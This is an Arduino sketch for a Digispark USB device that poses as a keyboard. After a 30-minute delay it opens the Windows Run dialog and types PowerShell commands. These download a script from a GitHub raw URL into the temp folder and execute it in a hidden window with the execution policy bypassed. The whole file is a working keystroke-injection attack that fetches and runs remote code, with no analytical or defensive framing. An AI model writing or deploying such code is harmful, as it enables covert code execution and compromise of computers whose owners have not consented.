#include "DigiKeyboard.h"
/* Init function */
void setup()
{
 delay(1800000);		// waits for x seconds in milliseconds, 30 minutes is 1800000 milliseconds

 //turn LED off while code is running, this means the device is safe to unplug as soon as the LED turns back on
 pinMode(1, OUTPUT);
 digitalWrite(1, HIGH);
 DigiKeyboard.delay(500);
 digitalWrite(1, LOW);
 DigiKeyboard.sendKeyStroke(0);

 DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
 DigiKeyboard.delay(100);
 DigiKeyboard.println("powershell");
 DigiKeyboard.sendKeyStroke(KEY_ENTER);
 DigiKeyboard.delay(100);
 DigiKeyboard.println("cd $env:TEMP ");
 DigiKeyboard.sendKeyStroke(KEY_ENTER);
 DigiKeyboard.delay(100);
 DigiKeyboard.println("echo (wget 'https://raw.githubusercontent.com/mbauer599/rubberduckyrun/master/run').content > b.ps1");
 DigiKeyboard.sendKeyStroke(KEY_ENTER);
 DigiKeyboard.delay(50);
 DigiKeyboard.println("powershell -windowstyle hidden -ExecutionPolicy ByPass -File b.ps1");
 DigiKeyboard.sendKeyStroke(KEY_ENTER);
 DigiKeyboard.println("exit");
 DigiKeyboard.sendKeyStroke(KEY_ENTER);
 DigiKeyboard.delay(100);
 digitalWrite(1, HIGH);
}

/* Unused endless loop */
void loop() {}
